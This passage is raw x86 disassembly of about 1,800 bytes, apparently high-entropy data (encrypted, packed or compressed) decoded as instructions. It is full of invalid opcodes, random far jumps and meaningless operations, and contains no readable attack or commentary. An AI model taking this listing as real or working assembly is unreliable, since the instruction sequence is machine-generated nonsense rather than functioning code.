  40284c:	imul   cl
  40284e:	push   ecx
  40284f:	scas   al,BYTE PTR es:[edi]
  402850:	dec    ecx
  402851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402852:	xchg   edi,eax
  402853:	mov    al,ds:0xeb5797d6
  402858:	sub    DWORD PTR ds:0xad225c15,ecx
  40285e:	popf   
  40285f:	mov    DWORD PTR [edi-0x33],ecx
  402862:	add    ch,al
  402864:	fwait
  402865:	sub    al,0x97
  402867:	and    cl,ch
  402869:	imul   ebx,esp,0x2927398e
  40286f:	inc    edx
  402870:	js     0x402846
  402872:	or     eax,0x13603a22
  402877:	sub    DWORD PTR [ecx-0x5c43c820],eax
  40287d:	repnz mov ecx,0x349f997d
  402883:	pop    ss
  402884:	add    al,0x91
  402886:	aas    
  402887:	mov    esp,0x7d48a0d8
  40288c:	push   edx
  40288d:	imul   sp,WORD PTR [esi+0x7e],0x8ed6
  402893:	mov    ds:0xe5a499a9,al
  402898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402899:	add    ah,BYTE PTR [ebp+0x28]
  40289c:	dec    esp
  40289d:	hlt    
  40289e:	add    DWORD PTR ss:[edi-0x6a],eax
  4028a2:	or     DWORD PTR [edx-0x6ba8b2c4],eax
  4028a8:	jmp    0xc7f22778
  4028ad:	test   ecx,ebx
  4028af:	cmp    BYTE PTR [ebp-0x163534d2],bl
  4028b5:	lock adc DWORD PTR [ecx-0x13],esi
  4028b9:	cmp    DWORD PTR cs:[ebx+0x6e],edx
  4028bd:	mov    ah,0x85
  4028bf:	test   BYTE PTR [ecx+0x7538fb39],0xab
  4028c6:	cmp    eax,esi
  4028c8:	daa    
  4028c9:	inc    esp
  4028ca:	mov    dh,0x94
  4028cc:	jno    0x402949
  4028ce:	push   ecx
  4028cf:	dec    ebp
  4028d0:	add    eax,eax
  4028d2:	inc    edi
  4028d3:	jp     0x402933
  4028d5:	icebp  
  4028d6:	jp     0x40293c
  4028d8:	and    edi,DWORD PTR [ebx-0x4fbfe812]
  4028de:	jmp    0xc195:0x8b254b81
  4028e5:	cmp    ebp,DWORD PTR [ebp+0x3553ab0d]
  4028eb:	jmp    0x40289c
  4028ed:	imul   esp,ebp,0xf
  4028f0:	aad    0x2d
  4028f2:	lahf   
  4028f3:	sub    DWORD PTR [ebx],ebx
  4028f5:	js     0x40287e
  4028f7:	cdq    
  4028f8:	popa   
  4028f9:	xchg   ebp,eax
  4028fa:	dec    eax
  4028fb:	xchg   edx,eax
  4028fc:	mov    ecx,DWORD PTR [edi-0x70]
  4028ff:	or     eax,0x6a8cddd7
  402904:	jmp    0x402889
  402906:	nop
  402907:	xor    ebp,DWORD PTR [edi]
  402909:	cmp    al,0x89
  40290b:	push   esp
  40290c:	lea    eax,[ebx]
  40290e:	rol    BYTE PTR [eax],0xab
  402911:	pop    edx
  402912:	fcomp  st(7)
  402914:	push   ebp
  402915:	sub    dl,BYTE PTR [edi+ecx*8]
  402918:	pop    ss
  402919:	outs   dx,BYTE PTR ds:[esi]
  40291a:	sahf   
  40291b:	leave  
  40291c:	sbb    BYTE PTR [esi+0x12],0x1b
  402920:	inc    eax
  402921:	jp     0x4028e0
  402923:	or     BYTE PTR [ebp-0x491a4043],al
  402929:	(bad)  
  40292a:	lock mov ah,0xe0
  40292d:	jg     0x402912
  40292f:	jg     0x40298c
  402931:	clc    
  402932:	int3   
  402933:	cli    
  402934:	int    0xa6
  402936:	and    al,0xf6
  402938:	mov    dh,0x80
  40293a:	daa    
  40293b:	shl    DWORD PTR [esi-0x4e262508],cl
  402941:	inc    edx
  402942:	mov    DWORD PTR [ebx+0x3a],ebp
  402945:	xchg   esp,eax
  402946:	or     dl,BYTE PTR [edx-0x37448468]
  40294c:	cmp    eax,esi
  40294e:	xlat   BYTE PTR ds:[ebx]
  40294f:	clc    
  402950:	das    
  402951:	push   edx
  402952:	fisub  DWORD PTR [ebx-0x7e673971]
  402958:	and    ecx,DWORD PTR [esi+eax*8]
  40295b:	rcr    DWORD PTR [ecx+0x3c095c88],1
  402961:	(bad)  
  402962:	cmp    BYTE PTR [ebx],ch
  402964:	js     0x402971
  402966:	sbb    dh,BYTE PTR [eax]
  402968:	in     al,dx
  402969:	xchg   DWORD PTR [edx+ebx*2+0x11],esi
  40296d:	ja     0x4029eb
  40296f:	push   ebx
  402970:	cmp    BYTE PTR [eax-0x1e],dl
  402973:	shr    BYTE PTR [edx+0x7052165a],cl
  402979:	add    edx,DWORD PTR [ecx]
  40297b:	je     0x4029d1
  40297d:	bound  esp,QWORD PTR [ebx]
  40297f:	mov    WORD PTR [ebp-0x3d364d32],?
  402985:	pusha  
  402986:	jmp    0xaf217ab3
  40298b:	cvtdq2ps xmm4,XMMWORD PTR [ebx+0x6e]
  40298f:	mov    ecx,0x51c853d
  402994:	sub    BYTE PTR [ebx-0x2ca6413e],0x17
  40299b:	in     al,0x4e
  40299d:	dec    esi
  40299e:	dec    edi
  40299f:	push   esi
  4029a0:	and    al,0x7b
  4029a2:	adc    BYTE PTR [esp+eax*4+0x6e],cl
  4029a6:	jle    0x4029c1
  4029a8:	retf   
  4029a9:	pminub mm5,QWORD PTR [ecx+0x6e]
  4029ad:	fsub   DWORD PTR [esi+0x1bd4edd1]
  4029b3:	fiadd  DWORD PTR [ecx+0x10]
  4029b6:	aaa    
  4029b7:	mov    esi,0x4acc476f
  4029bc:	push   esp
  4029bd:	sbb    al,0x56
  4029bf:	cmp    esp,esi
  4029c1:	push   ebx
  4029c2:	das    
  4029c3:	mov    dl,0xfc
  4029c5:	mov    dl,0x77
  4029c7:	sbb    BYTE PTR [ecx],dh
  4029c9:	iret   
  4029ca:	cmp    DWORD PTR [esp+eiz*4-0x48],ebx
  4029ce:	not    DWORD PTR [edi+esi*2]
  4029d1:	jmp    0x4245f165
  4029d6:	xchg   BYTE PTR [ebp+0x2d6c2f06],ch
  4029dc:	sahf   
  4029dd:	ds jl  0x40297f
  4029e0:	mov    edi,0x72c86cad
  4029e5:	sbb    dl,al
  4029e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029e8:	add    BYTE PTR [edi+0x67281325],dl
  4029ee:	xchg   ebp,eax
  4029ef:	xlat   BYTE PTR ds:[ebx]
  4029f0:	(bad)  [ecx]
  4029f2:	jecxz  0x402a38
  4029f4:	and    BYTE PTR [eax+0x45],dl
  4029f7:	test   eax,0x39a506d7
  4029fc:	mov    esp,0xd9106518
  402a01:	and    eax,0x77149160
  402a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a07:	pusha  
  402a08:	xchg   ebp,eax
  402a09:	jp     0x402a52
  402a0b:	mov    WORD PTR ss:[edi-0x5180f9e6],es
  402a12:	out    dx,eax
  402a13:	push   ecx
  402a14:	lods   eax,DWORD PTR ds:[esi]
  402a15:	in     eax,0x59
  402a17:	mov    bl,0x7e
  402a19:	or     eax,0x1f9eb772
  402a1e:	(bad)  
  402a1f:	or     dh,BYTE PTR [ebx+0x2]
  402a22:	and    al,0xfa
  402a24:	mov    bh,0xef
  402a26:	(bad)  
  402a27:	lea    edx,[esi-0x2244a5c3]
  402a2d:	xchg   edx,eax
  402a2e:	fistp  WORD PTR [esi]
  402a30:	es std 
  402a32:	test   BYTE PTR [eax],bh
  402a34:	and    ecx,DWORD PTR [esp+eax*1]
  402a37:	into   
  402a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a39:	stos   DWORD PTR es:[edi],eax
  402a3a:	and    DWORD PTR [ecx+0x17077e19],ebx
  402a40:	pop    edi
  402a41:	xchg   edx,eax
  402a42:	scas   eax,DWORD PTR es:[edi]
  402a43:	and    ah,al
  402a45:	dec    edi
  402a46:	ins    BYTE PTR es:[edi],dx
  402a47:	and    ah,dh
  402a49:	gs mov dl,0x67
  402a4c:	or     BYTE PTR [ebx-0x14],al
  402a4f:	mov    ebx,cs
  402a51:	or     ecx,ebp
  402a53:	xchg   esp,eax
  402a54:	pop    ds
  402a55:	jbe    0x402a83
  402a57:	pop    ebp
  402a58:	imul   ebp,DWORD PTR [esi-0x57bc81ed],0xaad13663
  402a62:	adc    DWORD PTR [eax-0x296a9937],esp
  402a68:	mul    BYTE PTR [ebx-0x6a7c4258]
  402a6e:	mov    ebp,0xf1484d94
  402a73:	fadd   DWORD PTR [eax-0x16]
  402a76:	xchg   edx,eax
  402a77:	dec    esi
  402a78:	push   eax
  402a79:	imul   ecx,DWORD PTR [eax+0x34fe15f3],0x1b
  402a80:	mov    al,0x73
  402a82:	jbe    0x402a92
  402a84:	xor    DWORD PTR [ebx-0x5da6356d],0x2ad453e5
  402a8e:	or     al,0x64
  402a90:	aas    
  402a91:	pop    ebx
  402a92:	sbb    al,0x9e
  402a94:	mov    edx,ebp
  402a96:	add    dh,al
  402a98:	xchg   edi,eax
  402a99:	mov    ah,0x24
  402a9b:	nop
  402a9c:	push   ds
  402a9d:	(bad)  
  402a9e:	arpl   si,bp
  402aa0:	sub    ebx,DWORD PTR [esi-0x70]
  402aa3:	mov    ah,0xa1
  402aa5:	lea    eax,[edi]
  402aa7:	ins    BYTE PTR es:[edi],dx
  402aa8:	dec    edx
  402aa9:	lea    ebx,[ecx+0xa]
  402aac:	cmp    BYTE PTR ds:0x6f7551a8,bl
  402ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ab3:	inc    esi
  402ab4:	sahf   
  402ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ab6:	pushf  
  402ab7:	jns    0x402ae1
  402ab9:	xchg   edx,eax
  402aba:	jnp    0x402b29
  402abc:	jo     0x402a76
  402abe:	repnz sti 
  402ac0:	jne    0x402a9b
  402ac2:	test   BYTE PTR [ebp-0x38],bl
  402ac5:	jge    0x402a93
  402ac7:	sub    eax,0xeb135183
  402acc:	push   edx
  402acd:	mov    ch,0x72
  402acf:	int3   
  402ad0:	fst    DWORD PTR [esi]
  402ad2:	fucomi st,st(6)
  402ad4:	sbb    eax,DWORD PTR [ecx+0x49032061]
  402ada:	dec    esp
  402adb:	rol    DWORD PTR [bp+si+0x51],1
  402adf:	pop    ebx
  402ae0:	lods   al,BYTE PTR ds:[esi]
  402ae1:	xchg   ebx,eax
  402ae2:	sbb    dh,ch
  402ae4:	imul   edx,DWORD PTR [ebx+0x5],0xffffffb1
  402ae8:	mov    ch,0xc5
  402aea:	mov    al,0xf8
  402aec:	dec    edx
  402aed:	adc    DWORD PTR [esi+0x7a],edi
  402af0:	test   BYTE PTR [eax],bl
  402af2:	stc    
  402af3:	inc    ebp
  402af4:	daa    
  402af5:	xor    BYTE PTR [edi+esi*8],0x47
  402af9:	mov    al,0x5
  402afb:	shl    BYTE PTR ds:0x6ca74aef,0x83
  402b02:	mov    al,ds:0x4c354397
  402b07:	mov    esp,0x441d509a
  402b0c:	adc    esi,esp
  402b0e:	inc    edx
  402b0f:	inc    edi
  402b10:	inc    esp
  402b11:	and    BYTE PTR [ebx-0x2],0x1
  402b15:	and    eax,0xae05232c
  402b1a:	mov    eax,0x7e151395
  402b1f:	int3   
  402b20:	dec    ecx
  402b21:	xor    eax,0xffffff94
  402b24:	fbld   TBYTE PTR [eax+0xc]
  402b27:	add    eax,0xf0d115c3
  402b2c:	pop    eax
  402b2d:	mov    ss,ebp
  402b2f:	xor    DWORD PTR [esi-0x2c],ecx
  402b32:	pusha  
  402b33:	call   0x9b72:0x7e105675
  402b3a:	jmp    0x402ae1
  402b3c:	xor    BYTE PTR [eax-0x29],0xb8
  402b40:	sbb    bh,dl
  402b42:	mov    ds:0xa439e80d,eax
  402b47:	or     dl,BYTE PTR [ebp+0x4e0071b6]
  402b4d:	je     0x402b0e
  402b4f:	pop    ss
  402b50:	xchg   esp,eax
  402b51:	add    al,0xbd
  402b53:	mov    DWORD PTR [esi],edi
  402b55:	aas    
  402b56:	push   ebp
  402b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b58:	imul   BYTE PTR [edi-0x22564fd5]
  402b5e:	cld    
  402b5f:	mov    DWORD PTR [esi+eax*2+0x7],ebx
  402b63:	jne    0x402b58
  402b65:	sub    al,0x15
  402b67:	or     ecx,DWORD PTR [edx+0x2c]
  402b6a:	cmc    
  402b6b:	push   ds
  402b6c:	sbb    edi,ecx
  402b6e:	and    eax,0x3e0c910
  402b73:	icebp  
  402b74:	mov    dh,0xa
  402b76:	cdq    
  402b77:	cwde   
  402b78:	push   ss
  402b79:	loopne 0x402b9f
  402b7b:	adc    ch,BYTE PTR [ebp-0xaaeb263]
  402b81:	std    
  402b82:	or     DWORD PTR [esi],0x4b
  402b85:	(bad)  
  402b86:	cld    
  402b87:	into   
  402b88:	in     al,dx
  402b89:	sbb    eax,0x85cdea3d
  402b8e:	lds    ebp,FWORD PTR [edx]
  402b90:	xlat   BYTE PTR ds:[ebx]
  402b91:	arpl   WORD PTR [esi-0x37749f8b],bp
  402b97:	pop    esp
  402b98:	sbb    esi,ebx
  402b9a:	std    
  402b9b:	adc    eax,0x1a32d216
  402ba0:	mov    ds,WORD PTR [esp+eax*8+0x28b65c5]
  402ba7:	sbb    edx,DWORD PTR [esp+edi*1-0x2158c5fc]
  402bae:	test   eax,0xc47b922a
  402bb3:	adc    eax,0xe068eca3
  402bb8:	clc    
  402bb9:	lahf   
  402bba:	cwde   
  402bbb:	rcl    DWORD PTR [esi],1
  402bbd:	push   ebx
  402bbe:	xor    al,0x17
  402bc0:	push   ds
  402bc1:	and    al,0x40
  402bc3:	push   esp
  402bc4:	push   ebx
  402bc5:	mov    DWORD PTR [edi+0x68cd67a8],ebx
  402bcb:	pop    ebx
  402bcc:	test   BYTE PTR [edx],dl
  402bce:	ficomp WORD PTR [esi+0x79]
  402bd1:	(bad)  
  402bd2:	stc    
  402bd3:	out    dx,al
  402bd4:	inc    edi
  402bd5:	(bad)  [edx-0x6f9aba9]
  402bdb:	lods   eax,DWORD PTR ds:[esi]
  402bdc:	pusha  
  402bdd:	(bad)  [esi+0x22ca0e4]
  402be3:	xchg   edx,eax
  402be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402be5:	mov    edx,0x33054b6d
  402bea:	test   DWORD PTR [ebp+0x173d09d5],esi
  402bf0:	out    0x25,al
  402bf2:	repnz sub BYTE PTR [ebp-0x5b],bh
  402bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bf7:	mov    dh,0xd5
  402bf9:	cmp    al,0x40
  402bfb:	retf   0xfbd3
  402bfe:	or     BYTE PTR [eax],bh
  402c00:	shl    DWORD PTR [esi+esi*1],1
  402c03:	repz xor eax,0x5e6e7cdf
  402c09:	mov    bh,0x13
  402c0b:	pop    esp
  402c0c:	inc    esi
  402c0d:	fild   DWORD PTR [ecx-0x5717f50d]
  402c13:	jns    0x402bbd
  402c15:	test   eax,0xaf3079b0
  402c1a:	xchg   esp,eax
  402c1b:	lahf   
  402c1c:	xchg   dh,al
  402c1e:	xchg   DWORD PTR [edx],esi
  402c20:	and    al,0xaa
  402c22:	in     al,0x8b
  402c24:	icebp  
  402c25:	daa    
  402c26:	das    
  402c27:	adc    al,0x87
  402c29:	xor    al,BYTE PTR [edx]
  402c2b:	fdiv   QWORD PTR [esi]
  402c2d:	adc    ebp,DWORD PTR [ebp-0x3c]
  402c30:	cmp    edx,DWORD PTR [ebp+0xc20b7bc]
  402c36:	mov    ecx,0xf525787b
  402c3b:	jp     0x402bd1
  402c3d:	iret   
  402c3e:	mov    bh,0x34
  402c40:	je     0x402c0c
  402c42:	sahf   
  402c43:	shl    dh,0xb9
  402c46:	sub    DWORD PTR [ebx+0x5b],0xa44ce464
  402c4d:	les    esi,FWORD PTR [edi]
  402c4f:	push   eax
  402c50:	fst    QWORD PTR [edi-0x46114608]
  402c56:	imul   ecx,DWORD PTR [esp+ebx*4-0x55],0x3fe73dd6
  402c5e:	outs   dx,DWORD PTR ds:[esi]
  402c5f:	cs (bad) 
  402c61:	lods   al,BYTE PTR ds:[esi]
  402c62:	icebp  
  402c63:	xor    cl,BYTE PTR [edx-0x75b36f7b]
  402c69:	lods   eax,DWORD PTR ds:[esi]
  402c6a:	sbb    BYTE PTR [edx+0x34],al
  402c6d:	int    0x33
  402c6f:	cdq    
  402c70:	mov    ah,0xcf
  402c72:	cmp    eax,0x1ba8ed0d
  402c77:	mov    eax,0xee55f0ca
  402c7c:	addr16 inc eax
  402c7e:	not    BYTE PTR [esi-0x5]
  402c81:	ds dec ecx
  402c83:	je     0x402c56
  402c85:	std    
  402c86:	pop    eax
  402c87:	std    
  402c88:	(bad)  
  402c89:	dec    ebx
  402c8a:	scas   eax,DWORD PTR es:[edi]
  402c8b:	mov    dh,0x50
  402c8d:	mov    dh,0xa7
  402c8f:	jp     0x402c6c
  402c91:	mov    ebx,0x410e1d68
  402c96:	fisttp QWORD PTR [ebx+edx*1+0x7983779d]
  402c9d:	lock cmp DWORD PTR [edi-0x31],esp
  402ca1:	pop    ecx
  402ca2:	out    0x85,eax
  402ca4:	ins    BYTE PTR es:[edi],dx
  402ca5:	xchg   edx,eax
  402ca6:	jb     0x402d14
  402ca8:	or     BYTE PTR [eax+0x1f95b70e],0xf7
  402caf:	sbb    cl,BYTE PTR [ebx+0x70]
  402cb2:	mov    BYTE PTR [ecx],al
  402cb4:	and    dh,BYTE PTR [ecx]
  402cb6:	aad    0x7e
  402cb8:	adc    eax,0x981e2383
  402cbd:	mov    ah,0x7d
  402cbf:	jb     0x402cd4
  402cc1:	ret    
  402cc2:	push   es
  402cc3:	loope  0x402d2a
  402cc5:	ja     0x402ccc
  402cc7:	pushf  
  402cc8:	test   bl,dl
  402cca:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ccc:	jae    0x402c66
  402cce:	inc    edx
  402ccf:	fwait
  402cd0:	call   FWORD PTR [edx]
  402cd2:	outs   dx,DWORD PTR ds:[esi]
  402cd3:	fadd   st(6),st
  402cd5:	ds ins DWORD PTR es:[edi],dx
  402cd7:	push   0xfffffffc
  402cd9:	pop    es
  402cda:	popf   
  402cdb:	not    dh
  402cdd:	fs mov ebp,0x4dcde955
  402ce3:	pop    esp
  402ce4:	adc    eax,0xf636b09
  402ce9:	std    
  402cea:	mov    cl,0x8b
  402cec:	mov    al,ds:0xb368c640
  402cf1:	and    BYTE PTR [edx],al
  402cf3:	mov    dl,0x24
  402cf5:	lods   eax,DWORD PTR ds:[esi]
  402cf6:	retf   0x22d2
  402cf9:	add    eax,0xfa4014c9
  402cfe:	loopne 0x402d57
  402d00:	fs sbb eax,0xcf000627
  402d06:	rcl    DWORD PTR [eax-0x10],cl
  402d09:	test   DWORD PTR ss:[ecx],eax
  402d0c:	cs ret 
  402d0e:	mov    ds:0xebe96223,eax
  402d13:	imul   edi,DWORD PTR [eax-0x6ad745fb],0xffffff81
  402d1a:	bound  eax,QWORD PTR [edi]
  402d1c:	aad    0x92
  402d1e:	les    ecx,FWORD PTR [eax+ebx*8+0x7a433565]
  402d25:	je     0x402cea
  402d27:	ins    DWORD PTR es:[edi],dx
  402d28:	scas   eax,DWORD PTR es:[edi]
  402d29:	je     0x402d2a
  402d2b:	call   0xb32a:0x35698213
  402d32:	ret    
  402d33:	ja     0x402d19
  402d35:	mov    ecx,0x373c0147
  402d3a:	sub    esp,DWORD PTR [esp+edx*1-0x2e6eedf8]
  402d41:	push   eax
  402d42:	fcom   DWORD PTR [edi-0x1a256428]
  402d49:	add    BYTE PTR [edx-0x7cb8c5d6],0x91
  402d50:	sub    eax,0x1965cc88
  402d55:	push   esp
  402d56:	push   esi
  402d57:	test   eax,0xdb64594a
  402d5c:	ss in  eax,dx
  402d5e:	sahf   
  402d5f:	lds    ebx,FWORD PTR [esi+0x30]
  402d62:	in     al,0x73
  402d64:	xchg   ebx,eax
  402d65:	fisttp QWORD PTR [ecx-0x59843ecc]
  402d6b:	sti    
  402d6c:	mov    ds,eax
  402d6e:	cmp    esi,eax
  402d70:	repz mov eax,ds:0xecc4007a
  402d76:	add    DWORD PTR [eax+0xa40362a],esp
  402d7c:	pop    es
  402d7d:	mov    ds:0x73e01672,eax
  402d82:	or     ah,BYTE PTR [ebx-0x6a]
  402d85:	bound  esi,QWORD PTR ds:0xdb786f0e
  402d8b:	pop    ecx
  402d8c:	or     ecx,DWORD PTR [ebx]
  402d8e:	jmp    0xb44f2c4c
  402d93:	jae    0x402db6
  402d95:	push   ebx
  402d96:	jbe    0x402d9b
  402d98:	icebp  
  402d99:	sar    ah,cl
  402d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d9c:	mov    edi,0xdb2a4b3
  402da1:	addr16 and al,0x1d
  402da4:	nop
  402da5:	iret   
  402da6:	sar    BYTE PTR [ebp-0x49c0c31f],1
  402dac:	and    BYTE PTR [esi],cl
  402dae:	push   esi
  402daf:	data16 jle 0x402d58
  402db2:	fs xchg edx,eax
  402db4:	mov    bl,0x3b
  402db6:	mov    esi,0xced56d43
  402dbb:	int    0x9c
  402dbd:	and    BYTE PTR [ebx],cl
  402dbf:	(bad)  
  402dc0:	sub    eax,0xf2053768
  402dc5:	fisubr DWORD PTR [edi]
  402dc7:	push   edx
  402dc8:	frstor gs:0x1ab2f1a
  402dcf:	push   0x2b6d9bc
  402dd4:	mov    bh,0x9c
  402dd6:	xor    ebp,DWORD PTR [esi-0x203f9d0a]
  402ddc:	(bad)  
  402ddd:	xor    cl,BYTE PTR [esi]
  402ddf:	jecxz  0x402d8f
  402de1:	cmp    esi,esi
  402de3:	arpl   WORD PTR [ebx+0x22],bx
  402de6:	jle    0x402e04
  402de8:	in     al,dx
  402de9:	pop    es
  402dea:	in     eax,dx
  402deb:	ja     0x402da8
  402ded:	cli    
  402dee:	cs mov ecx,0x1a3025d9
  402df4:	cs xor dl,bh
  402df7:	jo     0x402d91
  402df9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dfa:	imul   esp,DWORD PTR [ecx],0x107a7889
  402e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e01:	inc    esp
  402e02:	mov    es,WORD PTR cs:[esi-0x54]
  402e06:	xor    eax,0x6f1c305c
  402e0b:	dec    esi
  402e0c:	add    dh,0xd3
  402e0f:	ficomp DWORD PTR [ebp-0x7f]
  402e12:	mov    ah,0xec
  402e14:	in     eax,dx
  402e15:	mov    al,ds:0xb5246e98
  402e1a:	(bad)  
  402e1b:	jmp    0x402dd1
  402e1d:	inc    esi
  402e1e:	stos   DWORD PTR es:[edi],eax
  402e1f:	adc    eax,0x4a9a2ca8
  402e24:	jl     0x402e62
  402e26:	adc    al,0x5
  402e28:	sbb    DWORD PTR [esi-0x17e6acbf],esi
  402e2e:	leave  
  402e2f:	mov    al,ds:0x72f8a4b5
  402e34:	and    DWORD PTR [ebx+eax*2-0x1f0e55c3],eax
  402e3b:	push   ebp
  402e3c:	jmp    0x852e0782
  402e41:	daa    
  402e42:	aam    0x18
  402e44:	loopne 0x402ebd
  402e46:	ins    BYTE PTR es:[edi],dx
  402e47:	outs   dx,DWORD PTR gs:[esi]
  402e49:	pop    eax
  402e4a:	sbb    al,0x6a
  402e4c:	and    BYTE PTR [ebp+0x32285c76],0xa9
  402e53:	adc    al,0xd8
  402e55:	pop    ss
  402e56:	xchg   esi,eax
  402e57:	and    eax,0x6c931a02
  402e5c:	in     eax,dx
  402e5d:	popf   
  402e5e:	xchg   esp,eax
  402e5f:	pop    edi
  402e60:	arpl   WORD PTR [edx-0x26],sp
  402e63:	stos   BYTE PTR es:[edi],al
  402e64:	mov    dh,0xb0
  402e66:	outs   dx,DWORD PTR ds:[esi]
  402e67:	or     al,BYTE PTR [ecx+0x724ab55f]
  402e6d:	and    dh,al
  402e6f:	loop   0x402dff
  402e71:	es pop ss
  402e73:	call   0xb50338ef
  402e78:	call   0x6163:0xd274448c
  402e7f:	dec    edx
  402e80:	xor    bh,BYTE PTR [edi]
  402e82:	mov    al,0xa1
  402e84:	xor    DWORD PTR [eax+edx*8-0xf],esp
  402e88:	leave  
  402e89:	mov    ds:0x4dc31ada,al
  402e8e:	les    esp,FWORD PTR [ebp-0x29d6e680]
  402e94:	dec    edi
  402e95:	xor    DWORD PTR [ecx],0x7e4a97d2
  402e9b:	ins    BYTE PTR es:[edi],dx
  402e9c:	pushf  
  402e9d:	shr    DWORD PTR [eax],cl
  402e9f:	(bad)  
  402ea0:	std    
  402ea1:	lahf   
  402ea2:	dec    edi
  402ea3:	ins    BYTE PTR es:[edi],dx
  402ea4:	js     0x402ec4
  402ea6:	dec    eax
  402ea7:	stos   WORD PTR es:[edi],ax
  402ea9:	mov    dl,0xd9
  402eab:	std    
  402eac:	xchg   edi,eax
  402ead:	mov    al,dl
  402eaf:	lahf   
  402eb0:	cmp    eax,0x9720f1cb
  402eb5:	hlt    
  402eb6:	sar    al,0x73
  402eb9:	or     dl,BYTE PTR [esp+eax*2+0x164a63dd]
  402ec0:	inc    esi
  402ec1:	out    dx,al
  402ec2:	aad    0x41
  402ec4:	call   ebp
  402ec6:	ins    BYTE PTR es:[edi],dx
  402ec7:	mov    esi,0xff8aedd8
  402ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ecd:	xor    eax,DWORD PTR [ecx-0x11c93e27]
  402ed3:	adc    ebx,DWORD PTR [ebx]
  402ed5:	jge    0x402f53
  402ed7:	je     0x402f00
  402ed9:	fwait
  402eda:	test   DWORD PTR [edi-0x6fdfe04d],edx
  402ee0:	pop    ebp
  402ee1:	das    
  402ee2:	stc    
  402ee3:	jmp    0xa4d8:0x41ed7234
  402eea:	leave  
  402eeb:	loop   0x402e97
  402eed:	addr16 std 
  402eef:	mov    BYTE PTR [esi+ebp*2],al
  402ef2:	mov    edi,0xbc624325
  402ef7:	add    al,0xb3
  402ef9:	inc    esi
  402efa:	int    0x52
  402efc:	lea    ecx,es:[ecx+0x618b360d]
  402f03:	xchg   edi,eax
  402f04:	sub    DWORD PTR [edi+0x12c5093e],edi
  402f0a:	fnsave [esi*8-0x6ddece4a]
  402f11:	iret   
  402f12:	and    BYTE PTR [eax],0x86
  402f15:	std    
  402f16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f17:	inc    edx
  402f18:	sub    DWORD PTR [esi+0x4e],esi
  402f1b:	ss inc esi
  402f1d:	out    0x5a,al
  402f1f:	mov    edx,0x46404680
  402f24:	xchg   edx,eax
  402f25:	cmp    bh,cl
  402f27:	sub    DWORD PTR [edi+0x73],edi
  402f2a:	sbb    al,0xdc
  402f2c:	xor    dl,BYTE PTR [esi+edx*1]
  402f2f:	mov    bh,0x53
  402f31:	dec    ebp
  402f32:	push   cs
  402f33:	jae    0x402fa3
  402f35:	ins    DWORD PTR es:[edi],dx
  402f36:	test   DWORD PTR [eax-0x59b98047],edx
  402f3c:	xor    eax,ebx
  402f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f3f:	inc    eax
  402f40:	out    dx,al
  402f41:	pop    edx
  402f42:	ret    
  402f43:	sbb    al,0x7a
  402f45:	out    dx,eax
  402f46:	pop    ebx
  402f47:	or     DWORD PTR [ebx-0x1456077b],ebp
  402f4d:	and    BYTE PTR fs:[esi+ebx*1-0x80],ch
  402f52:	jne    0x402f00
  402f54:	inc    ebx
  402f55:	jb     0x402fb8
  402f57:	idiv   BYTE PTR [esi]
  402f59:	dec    eax
  402f5a:	lods   al,BYTE PTR ds:[esi]
  402f5b:	bound  ebp,QWORD PTR [ecx+0x5699f808]
  402f61:	fcom   QWORD PTR [esi+0x4ae13a9a]
  402f67:	stos   DWORD PTR es:[edi],eax
  402f68:	ret    
  402f69:	adc    eax,0x448b6c92
  402f6e:	je     0x402f22
  402f70:	cmp    edi,ebp
  402f72:	xor    BYTE PTR [ecx-0x165ed746],dl
  402f78:	fwait
  402f79:	in     al,0xe0
  402f7b:	or     ecx,DWORD PTR [edx]
  402f7d:	ja     0x402f05
  402f7f:	add    al,0xaf
  402f81:	mov    bl,0xc9
  402f83:	or     DWORD PTR cs:[ecx],ebx
  402f86:	jecxz  0x402ff4
  402f88:	and    BYTE PTR [ebx-0x4c],cl
  402f8b:	fsub   QWORD PTR [ebp+0x63]
  402f8e:	jb     0x402faf
  402f90:	sbb    al,0x1e
  402f92:	cli    
  402f93:	jno    0x402fea
  402f95:	or     ah,BYTE PTR [ecx+ebp*4+0x49]
  402f99:	movups xmm7,xmm6
  402f9c:	add    ebp,edi
  402f9e:	jns    0x403014
  402fa0:	outs   dx,BYTE PTR ds:[esi]
  402fa1:	adc    eax,0x4a7825e2
  402fa6:	cdq    
  402fa7:	add    cl,BYTE PTR [ebx-0x3adb7e6e]
  402fad:	inc    esp
  402fae:	ret    0x3774
  402fb1:	add    BYTE PTR [ebp-0x736e6ba8],cl
  402fb7:	push   ecx
  402fb8:	push   ds
  402fb9:	jp     0x402fd7
  402fbb:	data16 aad 0xc0
  402fbe:	inc    edx
  402fbf:	shl    DWORD PTR [edi-0x68],cl
  402fc2:	lahf   
  402fc3:	mov    ds:0x61c617c2,al
  402fc8:	lea    esi,[ebp+0x3bcb6c3e]
  402fce:	nop
  402fcf:	(bad)  
  402fd0:	pusha  
  402fd1:	jbe    0x403052
  402fd3:	stos   DWORD PTR es:[edi],eax
  402fd4:	aas    
  402fd5:	clc    
  402fd6:	adc    DWORD PTR [ebp-0x2e],edx
  402fd9:	dec    edx
  402fda:	ror    ebx,cl
  402fdc:	ss pop es
  402fde:	retf   
  402fdf:	lods   eax,DWORD PTR ds:[esi]
  402fe0:	dec    esi
  402fe1:	enter  0xc7c0,0xd2
  402fe5:	inc    ebx
  402fe6:	lahf   
  402fe7:	pop    esp
  402fe8:	jge    0x403037
  402fea:	mov    dh,0x57
